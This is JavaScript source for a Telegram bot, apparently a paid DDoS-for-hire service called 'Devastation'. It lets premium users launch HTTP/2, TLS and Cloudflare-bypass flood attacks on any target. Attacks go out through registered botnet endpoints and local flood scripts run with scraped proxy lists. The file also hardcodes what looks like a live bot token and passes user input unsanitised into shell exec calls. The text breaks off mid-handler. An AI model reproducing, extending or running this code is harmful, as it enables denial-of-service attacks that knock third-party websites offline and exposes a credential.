const path = require('path');
const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const fs = require('fs');
const axios = require('axios');
const cheerio = require('cheerio');
const CFonts = require('cfonts');
const figlet = require("figlet")
const token = '8400441175:AAGu8M5rn28udlF5mQccbOLYybcbS-wNiWA';
const bot = new TelegramBot(token, {polling: true});
const adminData = JSON.parse(fs.readFileSync('admin.json', 'utf8'));
const adminIds = adminData.admins;
const timeLimit = parseInt(adminData.limit, 10);
async function PermenMDBotnet(endpoints, target, duration, methods) {
    let successCount = 0;

    for (const endpoint of endpoints) {
        const apiUrl = `${endpoint}?target=${target}&time=${duration}&methods=${methods}`;
        try {
            const response = await axios.get(apiUrl);
            if (response.status === 200) {
                successCount++;
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    }

    return successCount;
}
function loadBotnetData() {
    try {
        return JSON.parse(fs.readFileSync('./ddos/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        return { endpoints: [] };
    }
}

// Fungsi untuk menyimpan data botnet ke file JSON
function saveBotnetData(botnetData) {
    try {
        fs.writeFileSync('./ddos/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving botnet data:', error.message);
    }
}
const premDataPath = './prem.json';

// Fungsi untuk memuat data premium dari file
function loadPremData() {
    try {
        return JSON.parse(fs.readFileSync(premDataPath, 'utf8'));
    } catch (error) {
        return { users: [] };
    }
}

// Fungsi untuk menyimpan data premium ke file
function savePremData(premData) {
    fs.writeFileSync(premDataPath, JSON.stringify(premData, null, 2));
}

// Menangani perintah /addprem <id> <maxtime> <day>
bot.onText(/\/addplans (\d+) (\d+) (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const userId = match[1];
    const maxtime = parseInt(match[2], 10);
    const days = parseInt(match[3], 10);
    const isAdmin = adminIds.includes(fromId.toString());

    if (!isAdmin) {
        return bot.sendMessage(chatId, '❌ You do not have access to do this .');
    }

    let premData = loadPremData();
    let existingUser = premData.users.find(user => user.id === userId);

    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + days);

    if (existingUser) {
        existingUser.maxtime = maxtime;
        existingUser.expiry = expiryDate.toISOString();
    } else {
        premData.users.push({ id: userId, maxtime: maxtime, expiry: expiryDate.toISOString() });
    }

    savePremData(premData);
    bot.sendMessage(chatId, `✅ User ${userId} has become premium\n time brick attack: ${maxtime} second\nExpaired: ${days} hari (${expiryDate.toDateString()})`);
});
// Fungsi untuk memeriksa status host
async function checkHost(url) {
  try {
    const response = await axios.get(url, { timeout: 5000 });
    return `Status Code: ${response.status}\nResponse Time: ${response.request.res.responseTime}ms`;
  } catch (error) {
    return `Error: ${error.message}`;
  }
}
console.log(figlet.textSync('Bird-DDoS', {
    font: 'Standard',
    horizontalLayout: 'default',
    vertivalLayout: 'default',
    whitespaceBreak: false
  }))
  
    bot.on('message', (msg) => {
        const nama = msg.from?.first_name || msg.from?.username || 'Anonymous'; // Improved name handling
        const username = msg.from?.username || 'Anonymous'; 
        const userId = msg.from?.id || 'Unknown ID'; // Handle cases where ID might not be available
        const message = msg.text || msg.caption || 'Media atau pesan lain'; // Include caption for media messages

        console.log(`\x1b[97m──⟨ \x1b[42m\x1b[97m[ @${nama} ]\x1b[50m[ @${username} ]\x1b[44m\x1b[35m[ ${userId} ]\x1b[0m`);
        console.log(`\x1b[31mPesan: \x1b[0m${message}\x1b[0m\n`);
    });

let processes = {};
const stopProcesses = (chatId) => {
  if (processes[chatId]) {
    processes[chatId].forEach(proc => proc.kill());
    processes[chatId] = [];
    bot.sendMessage(chatId, 'Proses berhasil dihentikan.');
  } else {
    bot.sendMessage(chatId, 'Tidak ada proses yang berjalan.');
  }
};
const urls = [
  "https://raw.githubusercontent.com/RamaXgithub/proxysc3/refs/heads/main/proxy.txt",
  "https://raw.githubusercontent.com/RamaXgithub/proxysc4/refs/heads/main/proxy.txt",
  "https://raw.githubusercontent.com/RamaXgithub/proxysc2/refs/heads/main/proxy.txt",
  "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
];

async function scrapeProxies(chatId) {
  let proxies = [];
  const totalUrls = urls.length;
  let progressMessage = await bot.sendMessage(chatId, 'Memulai Scraper\n{ 0% }');

  for (let i = 0; i < totalUrls; i++) {
    try {
      const { data } = await axios.get(urls[i]);
      const $ = cheerio.load(data);

      $('tr').each((j, elem) => {
        const ip = $(elem).find('td').eq(0).text().trim();
        const port = $(elem).find('td').eq(1).text().trim();
        if (ip && port) {
          proxies.push(`${ip}:${port}`);
        }
      });
    } catch (error) {
      console.error(`Error scraping ${urls[i]}:`, error);
    }
    const progress = Math.round(((i + 1) / totalUrls) * 100);
    await bot.editMessageText(`Memulai Scraper\n{ ${progress}% }`, {
      chat_id: chatId,
      message_id: progressMessage.message_id
    });
  }
  fs.writeFileSync('./lib/proxy.txt', proxies.join('\n'), 'utf8');
  await bot.editMessageText('Proxy Berhasil Di Update', {
    chat_id: chatId,
    message_id: progressMessage.message_id
  });

  console.log(`Scraped ${proxies.length} proxies and saved to proxy.txt`);
}

const imageUrl = "https://files.catbox.moe/mfi7sd.jpg"; // Ganti dengan URL gambar yang valid

bot.onText(/\/start/, (msg) => {
  const name = msg.from.first_name;

  bot.sendPhoto(msg.chat.id, imageUrl, {
    caption: `Hello *${name}*, Welcome To *Devastation bot*\n\nPlease press the *Methods* button to display the attack methods.\n\nPower proof: @anomall404`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝙼𝚎𝚝𝚑𝚘𝚍𝚜", callback_data: "methods" }],
        [{ text: "𝙼𝚎𝚗𝚞 𝚘𝚠𝚗𝚎𝚛", callback_data: "srvmenu" }]
      ]
    }
  });
});

// 🔹 Handler tombol Methods, Srvmenu, dan Back
bot.on("callback_query", (query) => {
  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;
  const data = query.data;

  if (data === "methods") {
    bot.editMessageCaption(
      `
*this is the methods:*
- *Gecko* → Attacking HTTP
- *Xyn* → Good HTTP/2
- *Bypass* → Recaptcha Bypass
- *Tls* → Bypass Protected Websites
- *Raw* → Good for Non-SSL Target
- *Browser* → Good for Cloudflare attack
- *Glory* → High Request
- *Flood* → HTTP/2 Flood
- *H2-flood* → HTTP Flooding
- *C-f* → Cloudflare Bypass
- *Https* → HTTP Flooding
- *Pidoras* → Cloudflare Protection
- *H2-meris* → Attack Non-Protected Websites
- *Chap* → Attack UAM Websites

 *Usage:* 
\`/attack [Target] [Time] [Method]\`
      `,
      {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "Back", callback_data: "back" }]]
        }
      }
    );
  } else if (data === "srvmenu") {
    bot.editMessageCaption(
      `
*𝙼𝚎𝚗𝚞 𝚘𝚠𝚗𝚎𝚛:*

*srv menu:*
- \`/addbotnet [Endpoint]\` → Add botnet
- \`/testbotnet\` → Test botnet connection
- \`/listbotnet\` → Show active botnets
- \`/delbotnet [Index]\` → Remove botnet

*setting menu:*
- \`/addplans [ID]\` → create plans
- \`/delplans [ID]\` → remove plans
- \`/upproxy\` → upgrade proxy

Use these commands to manage botnets.
      `,
      {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "Back", callback_data: "back" }]]
        }
      }
    );
  } else if (data === "back") {
    bot.editMessageCaption(
      `Hello *${query.from.first_name}*, Welcome To *Devastation*\n\nPlease press the *Methods* button to display the attack methods.\n\nPower proof: @anomall404`,
      {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝙼𝚎𝚝𝚑𝚘𝚍𝚜", callback_data: "methods" }],
            [{ text: "𝙼𝚎𝚗𝚞 𝚘𝚠𝚗𝚎𝚛", callback_data: "srvmenu" }]
          ]
        }
      }
    );
  }
});
bot.onText(/\/method/, (msg) => {
const name = msg.from.first_name;
  bot.sendMessage(msg.chat.id, 
`
\`\`\`
this is the methods :
- Gecko
- Xyn
- Bypass
- Tls
- Meriam
- Raw
- Browser
- Glory
- Flood
- H2-flood 
- C-f
- Https
- Pidoras
- H2-meris
- Chap

How to use? Use like this /attack [ Target ] [ Time ] [ Methods ]
\`\`\`
  `, { parse_mode: "Markdown" });
});


bot.onText(/\/menubotnet/, (msg) => {
const name = msg.from.first_name;
  bot.sendMessage(msg.chat.id, 
`These are the commands related to botnets here:
 /addbotnet [ Endpoint ]
 /testbotnet
 /listbotnet
 /delbotnet [ Index ]
 `);
});

// Fungsi untuk memeriksa apakah user adalah premium
function isPremium(userId) {
    const premData = loadPremData();
    const user = premData.users.find(user => user.id === userId);
    if (!user) return false;
    
    const now = new Date();
    const expiryDate = new Date(user.expiry);
    
    return now <= expiryDate; // True jika masih dalam masa aktif
}

// Fungsi untuk mendapatkan maxtime user premium
function getUserMaxTime(userId) {
    const premData = loadPremData();
    const user = premData.users.find(user => user.id === userId);
    return user ? user.maxtime : 0;
}

bot.onText(/\/attack(?:\s+(\S+))?(?:\s+(\S+))?(?:\s+(\S+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const username = msg.from.username;

    // **Cek apakah user premium**
    if (!isPremium(fromId.toString())) {
        return bot.sendMessage(chatId, '❌ you dont have any plans');
    }

    // **Periksa format input**
    if (!match[1] || !match[2] || !match[3]) {
        return bot.sendMessage(chatId, '⚠️ *Incorrect format!*\n\n' +
            '`/attack [target] [duration] [methods]`\n' +
            '*Contoh:* `/attack http://example.com 60 tls`', 
            { parse_mode: 'Markdown' }
        );
    }

    bot.sendMessage(chatId, '⏳ in process....');

    const [target, duration, methods] = [match[1].trim(), match[2].trim(), match[3].trim()];
    const userMaxTime = getUserMaxTime(fromId.toString());

    if (parseInt(duration) > userMaxTime) {
        return bot.sendMessage(chatId, `❌ duration exceeds the limit, your limit is (${userMaxTime} second).`);
    }

    try {
        const parsedUrl = new URL(target);
        const hostname = parsedUrl.hostname;

        const response = await axios.get(`http://ip-api.com/json/${hostname}?fields=query,isp`);
        const result = response.data;

        const botnetData = JSON.parse(fs.readFileSync('./ddos/botnet.json', 'utf8'));
        const endpoints = botnetData.endpoints;
        const successCount = await PermenMDBotnet(endpoints, target, duration, methods);

        bot.sendMessage(chatId, 
            `*Attack Sent!*\n\n` +
            `*Target:* ${target}\n` +
            `*Duration:* ${duration} sec\n` +
            `*Methods:* ${methods}\n` +
            `*ISP:* ${result.isp}\n` +
            `*IP:* ${result.query}\n` +
            `*Total server:* ${successCount}`, 
            {
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: '🔍Check host',
                                url: `https://check-host.net/check-http?host=${target}`
                            }
                        ]
                    ]
                },
                reply_to_message_id: msg.message_id
            }
        );

    } catch (error) {
        console.error(`Error: ${error.message}`);
        bot.sendMessage(chatId, '❌ *failed to get information from target.*', { parse_mode: 'Markdown' });
    }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/\/addbotnet(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const text = match[1] ? match[1].trim() : '';  // Cek apakah ada argumen

    const isAdmin = adminIds.includes(fromId.toString());

    if (!isAdmin) {
        return bot.sendMessage(chatId, '*❌ you dont have access to do this.*', { parse_mode: "Markdown" });
    }

    if (!text) {
        return bot.sendMessage(chatId, 'Usage: /addbotnet <endpoint>\nExample: /addbotnet http://123.123.123.123:1234/permen');
    }

    try {
        const parsedUrl = new URL(text);
        const hostt = parsedUrl.host;
        const endpoint = 'http://' + hostt + '/permen';
        const botnetData = loadBotnetData();

        if (botnetData.endpoints.includes(endpoint)) {
            return bot.sendMessage(chatId, `Endpoint ${endpoint} is already in the botnet list.`);
        }

        botnetData.endpoints.push(endpoint);
        saveBotnetData(botnetData);
        bot.sendMessage(chatId, `Endpoint ${endpoint} added to botnet.`);
    } catch (error) {
        bot.sendMessage(chatId, `Invalid URL: ${text}`);
    }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/\/testbotnet/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    bot.sendMessage(chatId, 'Wait A Second...');

    const botnetData = loadBotnetData();
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=https://google.com&time=1&methods=ninja`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);

    botnetData.endpoints = validEndpoints;
    saveBotnetData(botnetData);

    bot.sendMessage(chatId, `Checked endpoints. ${successCount} botnet endpoint(s) are online.`);
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/\/listbotnet/, (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const botnetData = loadBotnetData();
    const isAdmin = adminIds.includes(fromId.toString());

  if (!isAdmin) {
    return bot.sendMessage(chatId, '*❌ you dont have access to do this.*', { parse_mode: "Markdown" });
  }

    if (botnetData.endpoints.length === 0) {
        return bot.sendMessage(chatId, 'Botnet list is empty.');
    }

    let response = '*Current Botnet:*\n';
    botnetData.endpoints.forEach((endpoint, index) => {
        response += `${index + 1}. ${endpoint}\n`;
    });

    bot.sendMessage(chatId, response, { parse_mode: 'Markdown' });
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/\/delbotnet (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const index = parseInt(match[1]) - 1;  // Konversi ke indeks array
    const isAdmin = adminIds.includes(fromId.toString());

    // Cek apakah user adalah admin
    if (!isAdmin) {
        return bot.sendMessage(chatId, '*❌ you dont have access to do this .*', { parse_mode: "Markdown" });
    }

    // Muat data botnet
    let botnetData;
    try {
        botnetData = loadBotnetData();
    } catch (error) {
        console.error('Error loading botnet data:', error);
        return bot.sendMessage(chatId, '*❌ error while deleting bot net.*');
    }

    // Cek apakah array endpoints ada dan valid
    if (!Array.isArray(botnetData.endpoints)) {
        return bot.sendMessage(chatId, '*❌ invalid endpoint data.*');
    }

    // Cek validitas indeks yang dimasukkan
    if (isNaN(index) || index < 0 || index >= botnetData.endpoints.length) {
        return bot.sendMessage(chatId, `Invalid index. Please provide a valid index from 1 to ${botnetData.endpoints.length}.`);
    }

    // Hapus endpoint yang sesuai
    botnetData.endpoints.splice(index, 1);

    // Simpan data botnet yang telah diperbarui
    try {
        saveBotnetData(botnetData);
    } catch (error) {
        console.error('Error saving botnet data:', error);
        return bot.sendMessage(chatId, '*❌ Eorr.*');
    }

    bot.sendMessage(chatId, 'Botnet endpoint deleted successfully.');
});


bot.onText(/^\/dbotnet(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'where is the target?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'what time is it?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, '❌you dont have access to do this.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `time exceeded\nTime limit ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/dbotnet.js ${target} ${time} 110 15 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By Devastation DDoS\nTarget: ${target}\nTime: ${time}\nRate: 110\nThread: 15\nDDoS By Devastation DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/h2-flash(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'target input');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'enter the time');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, '❌you dont have access to do this .');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `time exceeded\nTime limit ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/geckold.js ${target} ${time} 32 16 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By Devastation DDoS\nTarget: ${target}\nTime: ${time}\nRate: 32\nThread: 16\nDDoS By Devastation DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/h2-kill (?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'target input');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'time input');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, '❌you do not have access to this.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `time exceeded\nTime limit ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/404.js ${target} ${time} 32 16 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By Devastation DDoS\nTarget: ${target}\nTime: ${time}\nRate: 32\nThread: 16\nDDoS By Devastation DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/tlsvip(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'target input');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'time input');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, '❌You do not have access to do this .');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Time exceeded\nTime limit  ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/tlsvip.js ${target} ${time} 110 15 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By Devastation DDoS\nTarget: ${target}\nTime: ${time}\nRate: 110\nThread: 15\nDDoS By Devastation DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/tornado(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'target input');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'time input');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, '❌You do not have access to do this .');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Time exceeded\nTime limit  ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/tornado.js POST ${target} ${time} 15 110 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By Devastation DDoS\nTarget: ${target}\nTime: ${time}\nRate: 110\nThread: 15\nDDoS By Devastation DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/tls(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'target input');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'time input');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, '❌You do not have access to do this.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Time exceeded\nTime limit ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/tls.js ${target} ${time} 110 15 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By Devastation DDoS\nTarget: ${target}\nTime: ${time}\nRate: 110\nThread: 15\nDDoS By Devastation DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/browser(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'target input');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'time input');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, '❌you dont have access to do this .');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Time exceeded\nTime limit  ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/browser.js ${target} ${time} 32 6 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By Devastation DDoS\nTarget: ${target}\nTime: ${time}\nRate: 32\nThread: 6\nDDoS By Devastation DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/bypass(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'target input');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'time input');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, '❌You do not have access to do this.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Time exceeded\nTime limit ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/bypass.js POST ${target} ${time} 32 16 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By Devastation DDoS\nTarget: ${target}\nTime: ${time}\nRate: 32\nThread: 16\nDDoS By Devastation DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/h2-bypass(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'target input');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'time input');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, '❌You do not have access to do this.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Time exceeded\nTime limit ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/bypassv2.js  ${target} ${time} 110 15 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By Devastation DDoS\nTarget: ${target}\nTime: ${time}\nRate: 110\nThread: 15\nDDoS By Devastation DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/h2(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'target input');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'time input');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, '❌You do not have access to do this.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Time exceeded\nTime limit ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/h2.js  ${target} ${time} 100 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By Devastation DDoS\nTarget: ${target}\nTime: ${time}\nRate: 32\nThread: 16\nDDoS By Devastation DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/h2-bomb(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'target input');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'time input');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, '❌ You do not have access to do this .');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Time exceeded\nTime limit ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/BOMB.js  ${target} ${time} 110 15 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By Devastation DDoS\nTarget: ${target}\nTime: ${time}\nRate: 110\nThread: 15\nDDoS By Devastation-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/ghost(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'target input');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'time input');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, '❌You do not have access to do this.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Time exceeded\nTime limit ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/ASTRAL.js  ${target} ${time} 110 15 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By Devastation DDoS\nTarget: ${target}\nTime: ${time}\nRate: 110\nThread: 15\nDDoS By Devastation DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/chaptca(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'target input');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'time input');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, '❌You do not have access to do this.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Time exceeded\nTime limit ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/CLOUDFLARE.js ${target} ${time} 110 15 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By Devastation DDoS\nTarget: ${target}\nTime: ${time}\nRate: 110\nThread: 15\nDDoS By Devastation DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/thunder(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'target input');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'time input');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, '❌You do not have access to do this.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Time exceeded\nTime limit ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/thunder.js ${target} ${time} 60 15 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By Devastation DDoS\nTarget: ${target}\nTime: ${time}\nRate: 60\nThread: 15\nDDoS By Devastation DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/storm(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'target input');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'time input');
    return;
  }
